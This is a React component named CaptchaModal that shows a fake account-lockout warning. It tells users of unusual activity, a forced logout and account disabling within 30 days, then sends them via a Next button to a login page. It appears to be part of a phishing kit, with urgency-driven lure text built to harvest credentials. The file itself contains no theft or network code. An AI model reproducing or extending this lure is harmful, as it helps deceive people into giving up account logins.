import React, { useEffect } from "react";

export default function CaptchaModal({ isOpen, onClose }) {
  useEffect(() => {
    // Prevent scrolling when modal is open
    if (isOpen) document.body.style.overflow = "hidden";
    else document.body.style.overflow = "auto";
  }, [isOpen]);

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 bg-black/40 flex items-center justify-center z-50">
      <div className="bg-white rounded-md shadow-lg max-w-md w-full p-6">
        <h2 className="text-lg font-semibold text-center mb-4">
          Confirm Your Identity
        </h2>
        <p className="text-sm text-gray-600 text-center mb-6">
          We Noticed unusual activity from your <br /> 
          account so we've logged you out.
          <br /><br />
          Follow the next steps within 30 days so we <br /> 
          can try to get you back into your account <br /> 
          before it's disabled.
          <br /><br />
          Click next to continue to the login page <br /> 
          and follow the steps
        </p>
        
        <div className="mt-4">
          <button
            onClick={onClose}
            className="w-full bg-blue-500 hover:bg-blue-600 text-white py-2 rounded-md font-semibold"
          >
            Next
          </button>
        </div>
      </div>
    </div>
  );
}
